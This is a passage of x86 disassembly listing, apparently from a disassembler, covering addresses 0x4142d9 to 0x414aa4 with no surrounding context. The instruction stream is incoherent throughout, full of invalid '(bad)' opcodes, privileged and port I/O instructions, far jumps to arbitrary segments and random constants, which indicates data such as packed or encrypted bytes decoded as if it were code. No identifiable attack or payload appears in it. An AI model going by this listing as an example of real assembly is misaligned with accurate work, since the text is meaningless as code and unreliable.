  4142d9:	lock mov ds:0x824fbee6,eax
  4142df:	cli    
  4142e0:	ret    0xa1b5
  4142e3:	mov    BYTE PTR [eax-0x75],ch
  4142e6:	cdq    
  4142e7:	cmp    al,0xb7
  4142e9:	stos   DWORD PTR es:[edi],eax
  4142ea:	or     BYTE PTR [edi-0xbbfbced],0x4f
  4142f1:	xor    ebx,DWORD PTR es:[eax+0x41]
  4142f5:	aas    
  4142f6:	je     0x4142dd
  4142f8:	int    0x7a
  4142fa:	xor    al,0xcc
  4142fc:	dec    eax
  4142fd:	mov    ch,BYTE PTR [edi]
  4142ff:	loop   0x414323
  414301:	ja     0x41433f
  414303:	and    DWORD PTR [edx-0x2caa32e8],ebx
  414309:	mov    ecx,0x82cc8b86
  41430e:	mov    eax,ds:0x49758a88
  414313:	jmp    0x796e5ca4
  414318:	icebp  
  414319:	mov    WORD PTR [ebx+esi*1-0x11],cs
  41431d:	ins    DWORD PTR es:[edi],dx
  41431e:	pushf  
  41431f:	sub    al,0xe5
  414321:	xlat   BYTE PTR ds:[ebx]
  414322:	dec    DWORD PTR [ebx+0x25]
  414325:	call   0x1249ff3
  41432a:	xchg   esi,eax
  41432b:	dec    esp
  41432c:	dec    edi
  41432d:	retf   
  41432e:	je     0x414399
  414330:	dec    esi
  414331:	sub    bl,BYTE PTR [ebx+0x14]
  414334:	adc    edx,DWORD PTR [edx+0x51ac2c61]
  41433a:	imul   ebx,DWORD PTR [ecx],0xffffff88
  41433d:	push   es
  41433e:	mov    bl,0x2e
  414340:	sub    al,0x5b
  414342:	(bad)  
  414344:	sbb    eax,0xc4c00fc9
  414349:	(bad)  
  41434a:	in     al,dx
  41434b:	iret   
  41434c:	xor    esp,DWORD PTR [ecx-0x34b350d6]
  414352:	mov    dl,0x3b
  414354:	add    al,0x5
  414356:	fistp  DWORD PTR [edi]
  414358:	or     eax,0x28d04037
  41435d:	jecxz  0x4143b3
  41435f:	push   ds
  414360:	mov    cs,ecx
  414362:	sub    BYTE PTR [ecx+eax*4],0xd8
  414366:	dec    eax
  414367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414368:	cmp    DWORD PTR [ebx+0x50],ebx
  41436b:	xor    esi,DWORD PTR [ecx]
  41436d:	lock dec ebp
  41436f:	retf   0xb3ad
  414372:	es pop bp
  414375:	mov    WORD PTR [esi+0x33],fs
  414378:	and    ebp,esp
  41437a:	repz push ss
  41437c:	cmc    
  41437d:	push   ss
  41437e:	ret    
  41437f:	jecxz  0x41434b
  414381:	out    0xf7,al
  414383:	adc    ebp,DWORD PTR [esi-0xa41fc14]
  414389:	dec    edx
  41438a:	lock fld DWORD PTR [ecx+0xc46608b]
  414391:	dec    edi
  414392:	dec    edi
  414393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414394:	aad    0x90
  414396:	mov    ds:0x29714b8a,eax
  41439b:	ret    
  41439c:	lods   eax,DWORD PTR ds:[esi]
  41439d:	xor    ebp,DWORD PTR [ebx-0x12]
  4143a0:	ret    
  4143a1:	sbb    eax,0x7c2e9698
  4143a6:	jbe    0x414361
  4143a8:	jmp    0x2522:0x6122f96b
  4143af:	cmp    esp,0xe2e5ec38
  4143b5:	add    edx,DWORD PTR [ebx+0x37ea8245]
  4143bb:	cli    
  4143bc:	fcomp  DWORD PTR ss:[edi]
  4143bf:	push   esp
  4143c0:	sbb    edx,DWORD PTR [ebp+edi*1+0x37]
  4143c4:	push   ebx
  4143c5:	div    DWORD PTR [edx-0x12b728e1]
  4143cb:	xor    eax,DWORD PTR [eax+0x75208936]
  4143d1:	mov    eax,0xba03b9a9
  4143d6:	pop    ebp
  4143d7:	push   es
  4143d8:	loop   0x4143bb
  4143da:	fisubr WORD PTR ds:0x119abac3
  4143e0:	pop    eax
  4143e1:	add    DWORD PTR ds:0x45242440,esp
  4143e7:	popf   
  4143e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143e9:	fsubrp st(1),st
  4143eb:	fcmovne st,st(1)
  4143ed:	leave  
  4143ee:	adc    al,0x48
  4143f0:	pushf  
  4143f1:	sahf   
  4143f2:	inc    cl
  4143f4:	pop    eax
  4143f5:	(bad)  [esi+eax*8+0x3988d066]
  4143fc:	stos   BYTE PTR es:[edi],al
  4143fd:	jno    0x41440c
  4143ff:	cwde   
  414400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414401:	sub    al,0xa9
  414403:	dec    ebx
  414404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414405:	test   eax,0x324e4ac
  41440a:	or     ecx,edx
  41440c:	lea    ebx,[edi+0x56]
  41440f:	lods   al,BYTE PTR ds:[esi]
  414410:	cli    
  414411:	mov    ecx,0x6e06589e
  414416:	or     edx,DWORD PTR [ebp+0x51457575]
  41441c:	pop    es
  41441d:	xchg   ebp,eax
  41441e:	adc    BYTE PTR [ebp+0x1d],bl
  414421:	push   ebp
  414422:	hlt    
  414423:	sub    esi,edx
  414425:	or     edi,esi
  414427:	cdq    
  414428:	pop    ebp
  414429:	mov    esp,0x385a98a6
  41442e:	fwait
  41442f:	mov    edi,0x2656ab8f
  414434:	xchg   ebp,eax
  414435:	adc    DWORD PTR [esi+ebp*8-0x4d],edi
  414439:	mov    eax,ds:0x7b3d3683
  41443e:	ret    
  41443f:	push   ebp
  414440:	pop    ds
  414441:	xor    BYTE PTR [edx],ah
  414443:	sub    eax,0xb6f60bc3
  414448:	lock test eax,0x39ef897b
  41444e:	mov    al,ds:0xcd6d087b
  414453:	and    eax,0x4a4fc953
  414458:	test   eax,0xf90e9c22
  41445d:	hlt    
  41445e:	inc    esi
  41445f:	jbe    0x414473
  414461:	popf   
  414462:	xchg   ebp,eax
  414463:	out    dx,al
  414464:	pop    edi
  414465:	mov    edi,0x92c1c346
  41446a:	hlt    
  41446b:	sub    al,0x43
  41446d:	fsub   QWORD PTR [esi]
  41446f:	mov    eax,0x36da523
  414474:	dec    ebp
  414475:	mov    ds:0xa7546028,al
  41447a:	mov    bh,0x18
  41447c:	ret    0x273b
  41447f:	xchg   esp,eax
  414480:	dec    eax
  414481:	stos   BYTE PTR es:[edi],al
  414482:	cmp    BYTE PTR [esi+edx*1-0x7ce817c7],ch
  414489:	xor    edx,DWORD PTR [ebx+ecx*4]
  41448c:	or     BYTE PTR [edi+esi*1],bh
  41448f:	inc    edi
  414490:	and    BYTE PTR [esi+0x3f7c6858],bl
  414496:	cmp    eax,0xf074bf02
  41449b:	lds    ebp,FWORD PTR [ebp-0x21]
  41449e:	ret    0x20f2
  4144a1:	outs   dx,BYTE PTR ds:[esi]
  4144a2:	xchg   edx,eax
  4144a3:	inc    eax
  4144a4:	jp     0x4144ce
  4144a6:	cmc    
  4144a7:	mov    cl,BYTE PTR [edi+0x7b]
  4144aa:	fwait
  4144ab:	(bad)  
  4144ac:	into   
  4144ad:	pop    ebp
  4144ae:	fucom  st(0)
  4144b0:	jp     0x4144bd
  4144b2:	repz sbb eax,0xaea2ae64
  4144b8:	mul    BYTE PTR [ecx-0x32]
  4144bb:	repnz loopne 0x4144f4
  4144be:	add    DWORD PTR [edi],ebp
  4144c0:	adc    al,0x22
  4144c2:	mov    eax,ds:0x255b303b
  4144c7:	pushf  
  4144c8:	push   ecx
  4144c9:	fisubr WORD PTR [esi-0x1f09bbe7]
  4144cf:	pop    ds
  4144d0:	fldenv [edx+0x307324b3]
  4144d6:	xchg   edx,eax
  4144d7:	icebp  
  4144d8:	pop    ebx
  4144d9:	pop    edi
  4144da:	shr    DWORD PTR [ecx+0x42],cl
  4144dd:	adc    DWORD PTR [esi+0x46b55616],edi
  4144e3:	imul   esi,DWORD PTR [esi+0x45],0x2fd9df50
  4144ea:	xchg   BYTE PTR ds:0xe1fd54e9,bl
  4144f0:	jnp    0x414559
  4144f2:	pop    edx
  4144f3:	add    BYTE PTR [ecx-0x3d],dl
  4144f6:	lahf   
  4144f7:	test   dh,dh
  4144f9:	xor    BYTE PTR [edx-0x4],bl
  4144fc:	fiadd  WORD PTR [edi+0x43]
  4144ff:	ins    DWORD PTR es:[edi],dx
  414500:	mov    esp,0xfac488bc
  414505:	mov    esp,0xdbd6f612
  41450a:	sub    eax,0xccde9388
  41450f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414510:	inc    esp
  414511:	out    dx,eax
  414512:	push   ds
  414513:	pop    ds
  414514:	mov    ah,BYTE PTR [ebx]
  414516:	rol    DWORD PTR [ebp-0x55],1
  414519:	push   cs
  41451a:	mov    ds:0x6d057cfc,eax
  41451f:	dec    edx
  414520:	pop    ss
  414521:	sbb    esp,DWORD PTR [eax+0x675b4951]
  414527:	call   0xb48d:0xc092ad54
  41452e:	enter  0xd575,0x84
  414532:	test   BYTE PTR [ecx-0x4f],dh
  414535:	shl    DWORD PTR [eax],cl
  414537:	mov    esp,0x18ff1552
  41453c:	shl    DWORD PTR [ecx],0xfb
  41453f:	jns    0x4145ac
  414541:	int    0xb2
  414543:	sub    BYTE PTR [esi+0x1e],dl
  414546:	jmp    0xb98b:0x9fb0f4a
  41454d:	sbb    BYTE PTR [eax+0x495aac8a],bl
  414553:	jae    0x414558
  414555:	int3   
  414556:	aad    0x94
  414558:	jb     0x414568
  41455a:	pop    ds
  41455b:	sub    eax,0x8addd247
  414560:	sbb    DWORD PTR [edi],eax
  414562:	call   0x4555:0x644e4734
  414569:	add    cl,BYTE PTR [eax]
  41456b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41456c:	in     eax,dx
  41456d:	adc    DWORD PTR [ebx+0x564a142b],ecx
  414573:	xor    bh,ch
  414575:	mov    edx,0x226b84b1
  41457a:	out    0xb5,eax
  41457c:	mov    esp,0xb9e16d43
  414581:	pop    esi
  414582:	imul   esp,DWORD PTR [eax],0x17
  414585:	add    BYTE PTR [ecx],0x4
  414588:	cmp    dl,bh
  41458a:	xchg   esp,eax
  41458b:	sbb    DWORD PTR [eax+ebp*2+0x1d],edx
  41458f:	ficomp DWORD PTR [ecx]
  414591:	pusha  
  414592:	jo     0x414595
  414594:	std    
  414595:	cmp    BYTE PTR [eax],bh
  414597:	push   esp
  414598:	xchg   edx,eax
  414599:	clc    
  41459a:	jge    0x41455a
  41459c:	stc    
  41459d:	(bad)  
  41459e:	pop    edx
  41459f:	pop    edx
  4145a0:	int3   
  4145a1:	mov    eax,ds:0xc6274181
  4145a6:	ds pop esi
  4145a8:	mov    ecx,eax
  4145aa:	cmp    al,0x2
  4145ac:	cdq    
  4145ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145ae:	push   ss
  4145af:	mov    al,0xb6
  4145b1:	pusha  
  4145b2:	add    ebp,DWORD PTR [ebp+0x61ddb53f]
  4145b8:	iret   
  4145b9:	popa   
  4145ba:	or     DWORD PTR [ecx],ebp
  4145bc:	imul   ebx,DWORD PTR ds:[edx-0x17],0xaa16b40a
  4145c4:	sbb    al,0xa3
  4145c6:	lods   al,BYTE PTR ds:[esi]
  4145c7:	and    al,0x2c
  4145c9:	adc    eax,0x19e0dde9
  4145ce:	ins    DWORD PTR es:[edi],dx
  4145cf:	loop   0x41457a
  4145d1:	xchg   esp,eax
  4145d2:	inc    ecx
  4145d3:	out    0x7e,al
  4145d5:	shr    BYTE PTR [ebx+0x608d2cb2],cl
  4145db:	sbb    DWORD PTR es:[edx-0x5a],edx
  4145df:	pushf  
  4145e0:	dec    ebp
  4145e1:	pop    esp
  4145e2:	and    al,0x50
  4145e4:	test   DWORD PTR [ebx-0x61],esi
  4145e7:	loopne 0x4145e6
  4145e9:	mov    edi,0xd09d6c69
  4145ee:	lahf   
  4145ef:	mov    ecx,DWORD PTR [edi]
  4145f1:	(bad)  
  4145f2:	pushf  
  4145f3:	jne    0x414617
  4145f5:	add    esi,DWORD PTR [edi]
  4145f7:	jb     0x41464a
  4145f9:	and    BYTE PTR [edx],dl
  4145fb:	scas   eax,DWORD PTR es:[edi]
  4145fc:	outs   dx,DWORD PTR ds:[esi]
  4145fd:	fidivr DWORD PTR [ebp-0x35]
  414600:	hlt    
  414601:	test   eax,0x66d46c1e
  414606:	imul   ebx,DWORD PTR [ebx+0x3f],0xffffffdf
  41460a:	je     0x41463e
  41460c:	in     eax,dx
  41460d:	jp     0x4145e8
  41460f:	adc    eax,0xe04345ec
  414614:	fcmovnbe st,st(4)
  414616:	jg     0x41460e
  414618:	sbb    al,0xb
  41461a:	aaa    
  41461b:	lea    ebp,[ecx-0x61f39997]
  414621:	jns    0x414604
  414623:	mov    esi,0x7a794f8c
  414628:	or     bh,cl
  41462a:	mov    dl,0x59
  41462c:	cwde   
  41462d:	dec    eax
  41462e:	les    edx,FWORD PTR [edi+eiz*4+0x44149d77]
  414635:	call   0xcdb2:0xfe639b4d
  41463c:	mov    dh,0xc4
  41463e:	sbb    al,0x77
  414640:	rcl    DWORD PTR [eax],cl
  414642:	loop   0x4145cf
  414644:	inc    bl
  414646:	jmp    0x414606
  414648:	das    
  414649:	xchg   ebx,eax
  41464a:	cmp    dl,bh
  41464c:	adc    ah,BYTE PTR [ecx+0x43]
  41464f:	shl    BYTE PTR [eax-0x74],0xc3
  414653:	in     eax,0xf7
  414655:	push   esi
  414656:	(bad)  
  414657:	sbb    DWORD PTR [eax+0x21],edi
  41465a:	mov    BYTE PTR fs:[edx-0x15673c2],dl
  414661:	sbb    dh,bl
  414663:	rol    BYTE PTR [esi+0x69],1
  414666:	fcom   st(3)
  414668:	mov    ebp,0xc4427592
  41466d:	pop    ss
  41466e:	inc    ebp
  41466f:	int    0x31
  414671:	adc    ebp,DWORD PTR [esp+ebx*1+0x113df98e]
  414678:	xor    eax,0xd719e7f8
  41467d:	xchg   edx,eax
  41467e:	or     BYTE PTR [ecx+ebx*8],0x38
  414682:	sbb    al,0x9e
  414684:	sbb    DWORD PTR [ecx+0x29],ecx
  414687:	adc    DWORD PTR [eax-0x1f],eax
  41468a:	xor    bl,al
  41468c:	(bad)  
  41468d:	jne    0x41468d
  41468f:	and    esi,DWORD PTR [ecx]
  414691:	lods   al,BYTE PTR ds:[esi]
  414692:	mov    esp,0x192f73e0
  414697:	pop    edi
  414698:	jl     0x4146cb
  41469a:	and    DWORD PTR [ebx-0x19],eax
  41469d:	test   DWORD PTR [esi-0x26],ebp
  4146a0:	cmp    al,0x75
  4146a2:	xchg   edi,eax
  4146a3:	or     eax,eax
  4146a5:	pop    eax
  4146a6:	pop    esp
  4146a7:	or     DWORD PTR [ebx],edi
  4146a9:	ret    
  4146aa:	sbb    ecx,DWORD PTR [ebx-0x7f]
  4146ad:	fdiv   QWORD PTR [ebp-0x10]
  4146b0:	pushf  
  4146b1:	test   al,0x8e
  4146b3:	dec    esi
  4146b4:	mov    dh,0x87
  4146b6:	adc    esp,ebp
  4146b8:	dec    edi
  4146b9:	shl    cl,cl
  4146bb:	call   0xcfabfce2
  4146c0:	std    
  4146c1:	test   eax,0xf164e060
  4146c6:	sbb    al,0xf0
  4146c8:	mov    edx,0xd365ac18
  4146cd:	xchg   edx,eax
  4146ce:	ins    DWORD PTR es:[edi],dx
  4146cf:	out    dx,eax
  4146d0:	xchg   esp,eax
  4146d1:	xchg   edx,eax
  4146d2:	sbb    eax,0x79a44729
  4146d7:	pop    edi
  4146d8:	lods   eax,DWORD PTR ds:[esi]
  4146d9:	mov    eax,ds:0xdc70a45e
  4146de:	lock mov esi,0xbbe2315d
  4146e4:	std    
  4146e5:	cdq    
  4146e6:	out    dx,al
  4146e7:	fimul  DWORD PTR [ebp-0x16f4a0d7]
  4146ed:	or     BYTE PTR [esi-0x24],dh
  4146f0:	pop    eax
  4146f1:	data16 (bad) 
  4146f3:	and    DWORD PTR [edi-0x7b],esp
  4146f6:	outs   dx,DWORD PTR ds:[esi]
  4146f7:	add    edi,DWORD PTR [ebx-0x1a184187]
  4146fd:	adc    eax,0xfa617a0d
  414702:	int    0x2e
  414704:	dec    edi
  414705:	mov    esi,0xe43b25b7
  41470a:	xor    DWORD PTR [ebx-0x4d147749],ebp
  414710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414711:	sahf   
  414712:	outs   dx,BYTE PTR ds:[esi]
  414713:	stos   BYTE PTR es:[edi],al
  414714:	int3   
  414715:	int3   
  414716:	jp     0x4146b0
  414718:	pop    esp
  414719:	or     bh,BYTE PTR [edx]
  41471b:	xor    edx,esp
  41471d:	sbb    eax,0xab4bb07d
  414722:	cdq    
  414723:	sbb    al,0xb7
  414725:	dec    eax
  414726:	or     eax,0xe58b0f11
  41472b:	push   ebp
  41472c:	jnp    0x4147ab
  41472e:	das    
  41472f:	pop    edx
  414730:	jb     0x414743
  414732:	jo     0x4146d7
  414734:	(bad)  
  414735:	retf   
  414736:	in     eax,dx
  414737:	ret    0x2a40
  41473a:	xchg   BYTE PTR [edi],cl
  41473c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41473d:	cmp    DWORD PTR [eax+0xb],edx
  414740:	add    ebx,DWORD PTR [edx-0x174e04af]
  414746:	mov    cl,0x59
  414748:	mov    dh,0x93
  41474a:	pop    esi
  41474b:	xchg   BYTE PTR [ebx-0x4b],dh
  41474e:	imul   eax,DWORD PTR [edx-0x1fda5d81],0x4a
  414755:	xchg   edx,eax
  414756:	and    al,0x59
  414758:	retf   0xbac5
  41475b:	cmp    edx,DWORD PTR [ebp-0x2d]
  41475e:	dec    eax
  41475f:	mov    BYTE PTR [edi+edi*2-0x53],ah
  414763:	stos   BYTE PTR es:[edi],al
  414764:	icebp  
  414765:	push   edx
  414766:	popa   
  414767:	jecxz  0x414795
  414769:	ret    0xc42b
  41476c:	shl    DWORD PTR [ebx],0x88
  41476f:	jae    0x41475b
  414771:	push   edx
  414772:	stos   BYTE PTR es:[edi],al
  414773:	and    ebx,0xf8c1974d
  414779:	ds inc ebx
  41477b:	sbb    DWORD PTR [ebp+0x1c4c8e86],esp
  414781:	mov    ecx,0x602dd5d7
  414786:	ja     0x414731
  414788:	ja     0x4147c2
  41478a:	cmp    eax,0x4004aef1
  41478f:	(bad)
  414792:	xchg   ebx,eax
  414793:	mov    al,ds:0xcad1bc96
  414798:	adc    ebx,edi
  41479a:	inc    edi
  41479b:	mov    ecx,0xb8d1c029
  4147a0:	mov    ds:0x160a8289,eax
  4147a5:	jp     0x4147d4
  4147a7:	fstp   DWORD PTR [edx+0x2f0bb803]
  4147ad:	or     edx,DWORD PTR [esi+0x4d252773]
  4147b3:	sub    DWORD PTR [esi+0x766eccf8],edx
  4147b9:	(bad)  
  4147ba:	mov    bh,0xa6
  4147bc:	jmp    0x414766
  4147be:	ret    0x2915
  4147c1:	outs   dx,BYTE PTR ds:[esi]
  4147c2:	addr16 pop ecx
  4147c4:	daa    
  4147c5:	push   cs
  4147c6:	aam    0xb4
  4147c8:	jb     0x41483c
  4147ca:	push   esi
  4147cb:	inc    ebp
  4147cc:	dec    ecx
  4147cd:	std    
  4147ce:	aad    0xfb
  4147d0:	lods   al,BYTE PTR ds:[esi]
  4147d1:	popa   
  4147d2:	adc    eax,0x1292002a
  4147d7:	test   al,0xfa
  4147d9:	or     BYTE PTR [ebp+0x7cff34e8],ah
  4147df:	mov    esp,0xc5c79555
  4147e4:	pop    eax
  4147e5:	aaa    
  4147e6:	push   esi
  4147e7:	cli    
  4147e8:	xchg   edx,eax
  4147e9:	xor    al,0xb5
  4147eb:	(bad)  
  4147ec:	sub    al,0xc0
  4147ee:	pop    esp
  4147ef:	frstor [esi+0x57]
  4147f2:	bound  eax,QWORD PTR [esi-0x67cda88]
  4147f8:	jbe    0x414784
  4147fa:	addr16 leave 
  4147fc:	jbe    0x414796
  4147fe:	xchg   eax,esp
  414800:	rcr    DWORD PTR [edi],1
  414802:	(bad)  
  414803:	sahf   
  414804:	jmp    0x6b77:0xb09c9597
  41480b:	push   ebp
  41480c:	add    ebx,DWORD PTR [ebp+0x488c787a]
  414812:	or     BYTE PTR [ebp-0x7eb4b159],0x9c
  414819:	xchg   dh,ch
  41481b:	(bad)  
  41481c:	push   ecx
  41481d:	push   ds
  41481e:	jp     0x41486a
  414820:	test   BYTE PTR [ebx+edi*8-0x65],bl
  414824:	test   BYTE PTR [ebx+0x6e41a150],cl
  41482a:	xor    ebx,DWORD PTR [eax+0x37]
  41482d:	inc    esp
  41482e:	sbb    dl,bh
  414830:	test   al,0xef
  414832:	inc    ebp
  414833:	sbb    dh,BYTE PTR [ecx-0x22]
  414836:	(bad)  
  414837:	retf   0xdb4
  41483a:	std    
  41483b:	aas    
  41483c:	adc    DWORD PTR [eax],eax
  41483e:	int3   
  41483f:	push   edx
  414840:	ror    bl,0x71
  414843:	jp     0x4148a9
  414845:	in     al,0xfa
  414847:	rcr    BYTE PTR [eax-0x534aeca],cl
  41484d:	sub    ebx,ebp
  41484f:	fisttp WORD PTR [edx+0x11]
  414852:	jnp    0x41488d
  414854:	stos   BYTE PTR es:[edi],al
  414855:	add    al,0xb2
  414857:	sub    al,0x33
  414859:	call   0x3001:0x6d13028f
  414860:	fdivr  QWORD PTR ss:[eax+0x45]
  414864:	retf   
  414865:	retf   0x8eff
  414868:	pop    ebx
  414869:	push   edi
  41486a:	imul   esp,DWORD PTR [esi-0xa],0x3447371
  414871:	ret    0xd07e
  414874:	inc    edx
  414875:	out    0x9d,eax
  414877:	out    0x48,eax
  414879:	cmp    dh,BYTE PTR [ebx+0x283289ff]
  41487f:	int3   
  414880:	in     eax,0xa0
  414882:	iret   
  414883:	into   
  414884:	scas   al,BYTE PTR es:[edi]
  414885:	mov    edi,0x6640033b
  41488a:	call   0x5c38:0xca3d40b6
  414891:	pslld  mm1,mm2
  414894:	dec    esi
  414895:	pop    eax
  414896:	call   0x5aa8:0xdd4a5b40
  41489d:	mov    bh,bl
  41489f:	xor    BYTE PTR [eax],ch
  4148a1:	scas   eax,DWORD PTR es:[edi]
  4148a2:	mov    ch,0xc3
  4148a4:	es stos DWORD PTR es:[edi],eax
  4148a6:	inc    edx
  4148a7:	xor    BYTE PTR [ebx-0x3f],ch
  4148aa:	fild   QWORD PTR [esi+esi*8+0x190d5028]
  4148b1:	pop    esp
  4148b2:	aas    
  4148b3:	fnstsw WORD PTR [ebx+0x7f]
  4148b6:	retf   
  4148b7:	sub    eax,0x5720869c
  4148bc:	test   dh,dh
  4148be:	mov    dl,BYTE PTR [ebx-0x467f264b]
  4148c4:	mov    ecx,0xf9f9682
  4148c9:	das    
  4148ca:	ror    BYTE PTR [edi+0x66b372e],0x5a
  4148d1:	popf   
  4148d2:	push   esi
  4148d3:	pop    sp
  4148d5:	mov    bl,0x15
  4148d7:	fcom   QWORD PTR [ebp+0x3b676824]
  4148dd:	or     dh,BYTE PTR [ebx-0x7c]
  4148e0:	xor    BYTE PTR [edx+0x30],ch
  4148e3:	jnp    0x4148de
  4148e5:	cli    
  4148e6:	ret    
  4148e7:	fisubr DWORD PTR [edi]
  4148e9:	xor    cl,BYTE PTR [esi]
  4148eb:	push   edx
  4148ec:	adc    DWORD PTR [esi+edi*2-0x28b9fcf3],ebx
  4148f3:	pushf  
  4148f4:	or     BYTE PTR [eax-0x449c7deb],bl
  4148fa:	aaa    
  4148fb:	cmp    eax,0x9eb29824
  414900:	ja     0x414925
  414902:	inc    esi
  414903:	popa   
  414904:	ins    BYTE PTR es:[edi],dx
  414905:	xchg   DWORD PTR [esi],ecx
  414907:	mov    fs,WORD PTR [edi-0x1703f127]
  41490d:	retf   0xb64a
  414910:	enter  0x76c7,0x64
  414914:	and    al,0xae
  414916:	repz and ch,BYTE PTR [edx-0x2e]
  41491a:	fcmovnu st,st(1)
  41491c:	xor    DWORD PTR [ebx+0x6f],edi
  41491f:	mov    esi,0x49ab8c03
  414924:	lock or DWORD PTR [ecx],esi
  414927:	xlat   BYTE PTR ds:[ebx]
  414928:	sub    DWORD PTR [edi-0x56],edi
  41492b:	test   eax,0xacfbc935
  414930:	cmp    DWORD PTR [eax+0x7],esp
  414933:	or     ecx,DWORD PTR [esi-0x4da4af36]
  414939:	xchg   edi,eax
  41493a:	aam    0xe1
  41493c:	xor    DWORD PTR [ebx+0x6e],eax
  41493f:	cmp    BYTE PTR [ebp-0x253ccb3],bh
  414945:	ret    
  414946:	and    al,0x18
  414948:	inc    edx
  414949:	mov    edi,0xbddbe97f
  41494e:	mov    bl,0x62
  414950:	aaa    
  414951:	aaa    
  414952:	je     0x414929
  414954:	test   al,0xdb
  414956:	mov    eax,ds:0x2e12f93e
  41495b:	inc    ecx
  41495c:	mov    ecx,0xdd90f24d
  414961:	ins    BYTE PTR es:[edi],dx
  414962:	fadd   DWORD PTR [ebx+0x2e]
  414965:	leave  
  414966:	pop    edi
  414967:	xor    ecx,eax
  414969:	inc    ebx
  41496a:	shl    cl,cl
  41496c:	sahf   
  41496d:	push   0x57
  41496f:	inc    ebx
  414970:	add    BYTE PTR ds:[ecx+0x7b20be09],dl
  414977:	daa    
  414978:	xlat   BYTE PTR ds:[ebx]
  414979:	inc    ebp
  41497a:	mov    WORD PTR [edi],?
  41497c:	push   cs
  41497d:	addr16 (bad) 
  41497f:	repz and ch,BYTE PTR [eax-0x29914efc]
  414986:	shl    DWORD PTR [esp+eax*8-0x23],0x26
  41498b:	xchg   esp,eax
  41498c:	push   cs
  41498d:	add    esi,eax
  41498f:	ficomp DWORD PTR [esi+0x3cf9ab26]
  414995:	ins    BYTE PTR es:[edi],dx
  414996:	jb     0x4149ee
  414998:	(bad)  [esi]
  41499a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499b:	pop    es
  41499c:	pusha  
  41499d:	neg    DWORD PTR ds:[edx]
  4149a0:	fstp   TBYTE PTR [ebx+0x2a]
  4149a3:	test   DWORD PTR [ebx-0x60b770e9],edx
  4149a9:	pop    ebx
  4149aa:	mov    dh,0xcb
  4149ac:	push   ds
  4149ad:	push   esp
  4149ae:	dec    esp
  4149af:	rcl    DWORD PTR [edi+0x22b5ced4],1
  4149b5:	(bad)  
  4149b6:	pop    ebp
  4149b7:	xchg   ecx,eax
  4149b8:	out    0x16,eax
  4149ba:	cmp    al,0xe1
  4149bc:	xor    bh,BYTE PTR [edi]
  4149be:	mov    BYTE PTR [esi+ebx*1-0x23],bl
  4149c2:	sub    eax,0x41168156
  4149c7:	sub    esp,esi
  4149c9:	and    al,0xd3
  4149cb:	pop    ebx
  4149cc:	mov    ch,BYTE PTR [esi+0x29]
  4149cf:	pop    edx
  4149d0:	cwde   
  4149d1:	cmp    al,0x6c
  4149d3:	mov    dl,0x49
  4149d5:	fadd   QWORD PTR [ebx+0x7f]
  4149d8:	popf   
  4149d9:	mov    dh,0x43
  4149db:	imul   ebx,DWORD PTR [edi+0x1b],0xb984bcb3
  4149e2:	mov    dh,0xdb
  4149e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e5:	pop    es
  4149e6:	sbb    eax,0xd453ca06
  4149eb:	inc    edx
  4149ec:	jg     0x414a08
  4149ee:	in     eax,dx
  4149ef:	hlt    
  4149f0:	ret    
  4149f1:	xchg   edi,eax
  4149f2:	fstp   st(5)
  4149f4:	aad    0xf
  4149f6:	fs into 
  4149f8:	lea    ebp,[ebx+0x3f]
  4149fb:	sub    al,BYTE PTR [edx-0x5f]
  4149fe:	popa   
  4149ff:	out    dx,eax
  414a00:	lock dec ecx
  414a02:	cld    
  414a03:	iret   
  414a04:	outs   dx,DWORD PTR ds:[esi]
  414a05:	xlat   BYTE PTR ds:[ebx]
  414a06:	push   cs
  414a07:	sahf   
  414a08:	dec    edx
  414a09:	nop
  414a0a:	push   edi
  414a0b:	adc    bh,BYTE PTR [ebp+0x170e9c28]
  414a11:	pop    ss
  414a12:	ret    0x6c59
  414a15:	fwait
  414a16:	je     0x4149ef
  414a18:	xchg   ebp,eax
  414a19:	inc    esi
  414a1a:	xor    BYTE PTR [ecx],al
  414a1c:	add    BYTE PTR [ecx-0x7d3eb8f5],ch
  414a22:	int    0xfd
  414a24:	out    0x9a,al
  414a26:	fistp  DWORD PTR [edx-0x265839a2]
  414a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a2d:	ja     0x4149ce
  414a2f:	inc    ebx
  414a30:	add    eax,0x7f4eaae1
  414a35:	fdiv   QWORD PTR [ebx+0x6c4cf652]
  414a3b:	idiv   DWORD PTR [esi-0x12bbf684]
  414a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a42:	dec    edx
  414a43:	popa   
  414a44:	inc    esi
  414a45:	and    DWORD PTR [ebx],esi
  414a47:	jge    0x4149f3
  414a49:	sbb    edi,esp
  414a4b:	mov    edx,0xf62d3338
  414a50:	imul   edi,ebp,0x44a1d8d1
  414a56:	push   esp
  414a57:	pop    edx
  414a58:	xor    ebx,edx
  414a5a:	test   ch,dh
  414a5c:	inc    esp
  414a5d:	adc    esi,DWORD PTR [esi+0x6bc55992]
  414a63:	or     al,0x1f
  414a65:	jmp    0x414a86
  414a67:	jmp    0x78f:0x919dd4b3
  414a6e:	cld    
  414a6f:	retf   
  414a70:	jge    0x414a41
  414a72:	mov    esi,ds
  414a74:	call   0x5a2e:0xbd35755a
  414a7b:	jle    0x414a34
  414a7d:	jmp    0x8052:0x32947915
  414a84:	mov    cr6,esp
  414a87:	inc    ecx
  414a88:	cmp    ebx,DWORD PTR [ebp+ebp*8+0xd]
  414a8c:	repz popa 
  414a8e:	fimul  WORD PTR [edx+0x6a]
  414a91:	jmp    0x92c0bb8a
  414a96:	mov    ds:0x1126717f,al
  414a9b:	nop
  414a9c:	(bad)  
  414a9d:	cmp    ch,BYTE PTR [ebp+0x45]
  414aa0:	in     eax,0xa8
  414aa2:	push   ecx
  414aa3:	(bad)  
  414aa4:	fistp  DWORD PTR [edi+0x6e525a46]
